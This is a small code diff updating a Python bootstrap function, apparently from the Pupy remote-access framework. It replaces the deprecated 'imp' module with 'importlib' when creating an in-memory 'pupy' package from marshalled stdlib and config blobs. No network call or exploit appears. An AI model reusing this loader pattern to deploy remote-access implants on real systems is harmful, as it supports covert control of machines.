@@ -277,11 +277,12 @@ def bootstrap(stdlib, config, autostart=True):
         'from __future__ import print_function',
         'from __future__ import unicode_literals',
 
-        'import imp, sys, marshal',
+        'import importlib.util, sys, marshal',
 
         'stdlib = marshal.loads({stdlib})',
         'config = marshal.loads({config})',
-        'pupy = imp.new_module("pupy")',
+        'spec = importlib.util.spec_from_loader("pupy", loader=None)',
+        'pupy = importlib.util.module_from_spec(spec)',
         'pupy.__file__ = str("pupy://pupy/__init__.pyo")',
         'pupy.__package__ = str("pupy")',
         'pupy.__path__ = [str("pupy://pupy/")]',
